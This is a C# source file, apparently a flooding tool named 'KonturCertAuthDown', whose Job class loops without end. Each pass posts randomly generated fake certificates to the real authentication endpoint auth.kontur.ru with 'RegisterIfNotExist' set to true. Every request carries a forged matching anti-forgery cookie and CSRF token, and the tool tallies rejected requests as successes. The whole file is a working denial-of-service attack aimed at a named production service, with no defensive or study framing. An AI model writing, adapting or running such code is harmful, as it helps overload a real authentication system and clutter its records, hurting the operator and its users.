using System.Diagnostics;
using System.Net;
using System.Text;

namespace KonturCertAuthDown;

internal class Job
{
    private readonly int _requestsCountForTheSameCertificate;
    private readonly int _certificateRandomBase64StringBytesCount;
    private readonly HttpClient _httpClient;
    private readonly object _syncObject = new();
    private readonly Stopwatch _sw = new();
    private long _successRequestsCount;
    private long _failedRequestsCount;
    private long _requestToRecreateBody;
    private long _lastDurationMs;
    private string? _currentRequestBody;

    public Job(int requestsCountForTheSameCertificate = 200, int certificateRandomBase64StringBytesCount = 200)
    {
        _requestsCountForTheSameCertificate = requestsCountForTheSameCertificate;
        _requestToRecreateBody = _requestsCountForTheSameCertificate;
        _certificateRandomBase64StringBytesCount = certificateRandomBase64StringBytesCount;
        _httpClient = new HttpClient();
    }

    public JobStats Stats
    {
        get
        {
            lock (_syncObject)
            {
                return new JobStats(_successRequestsCount, _failedRequestsCount, _lastDurationMs);
            }
        }
    }

    public async Task DoAuthAsync()
    {
        while (true)
            try
            {
                await DoAuthStepAsync();
            }
            catch (Exception)
            {
                lock (_syncObject)
                {
                    _failedRequestsCount++;
                }
            }
    }

    private async Task DoAuthStepAsync()
    {
        var recreateBody = false;
        lock (_syncObject)
        {
            if (_requestToRecreateBody <= 0)
            {
                _requestToRecreateBody = _requestsCountForTheSameCertificate;
                recreateBody = true;
            }
        }

        if (_currentRequestBody == null || recreateBody)
        {
            var certificate = FakeCertificateBuilder.BuildBase64EncodedCertificate(_certificateRandomBase64StringBytesCount);
            _currentRequestBody = $"{{\"Certificate\": \"{certificate}\",\"RegisterIfNotExist\": true,\"IgnoreUntrustedHeuristicError\": true}}";
        }

        var guid = Guid.NewGuid().ToString("D");
        using var message = new HttpRequestMessage
        {
            Method = HttpMethod.Post,
            Content = new StringContent(_currentRequestBody, Encoding.UTF8, "application/json"),
            Headers =
            {
                // { "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0" },
                { "Cookie", $"AntiForgery={guid}" },
                { "X-CSRF-Token", guid }
            },
            RequestUri = new Uri("https://auth.kontur.ru/api/authentication/certificate/auth-by-cert")
        };

        _sw.Restart();
        using var response = await _httpClient.SendAsync(message, HttpCompletionOption.ResponseHeadersRead, CancellationToken.None);
        if (response.StatusCode != HttpStatusCode.NotAcceptable)
            lock (_syncObject)
            {
                _failedRequestsCount++;
            }
        else
            lock (_syncObject)
            {
                _lastDurationMs = _sw.ElapsedMilliseconds;
                _successRequestsCount++;
                _requestToRecreateBody--;
            }
    }
}